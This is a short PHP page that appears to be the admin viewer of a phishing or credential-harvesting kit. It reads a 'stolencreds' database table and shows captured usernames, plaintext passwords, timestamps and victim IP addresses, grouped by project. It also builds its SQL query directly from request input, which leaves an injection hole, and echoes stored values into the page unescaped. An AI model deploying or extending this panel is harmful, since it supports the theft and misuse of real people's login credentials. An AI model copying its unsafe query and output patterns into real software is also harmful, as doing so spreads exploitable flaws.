<HTML>
<BODY>
<CENTER>
<?php 

// Read Database Connection Variables
require_once '../dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// If the Project is Not Already Selected..
if(!isset($_REQUEST['project'])){

// Show Unique Projects (Not Including Blanks)
$sql1 = "SELECT DISTINCT location FROM stolencreds WHERE location != '';";
$result1 = $conn->query($sql1);
?>

<?php
// Show Project Drop Down Selection
?>
<h2>Select Project</h2>
<FORM METHOD="POST" ACTION="<?php echo $PHP_SELF;?>">
<SELECT NAME="project">

<?php
    // output data of each row
    while($row1 = $result1->fetch_assoc()) {
//$pw = $row["pass"];
echo "<option value=\"".$row1["location"]."\">".$row1["location"]."</option>";
    }

?>
</SELECT>
<INPUT TYPE="submit" value="Go!">
</FORM>
<?php
}

// If a Project is Selected Already After Posting to Self...
if(isset($_REQUEST['project'])){ $project = $_REQUEST['project'];

// Show Credentails for the Selected Project 
$sql = "SELECT * FROM stolencreds WHERE location = '$project';";
$result = $conn->query($sql);

?>
<h2>Stolen Credentials</h2>
<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH></TR>
<?php
    // output data of each row
    while($row = $result->fetch_assoc()) {
//$pw = $row["pass"];
echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td></tr>";
    }

printf($conn->error);

}

$conn->close();
?></TABLE>
</CENTER>
</BODY>
</HTML>
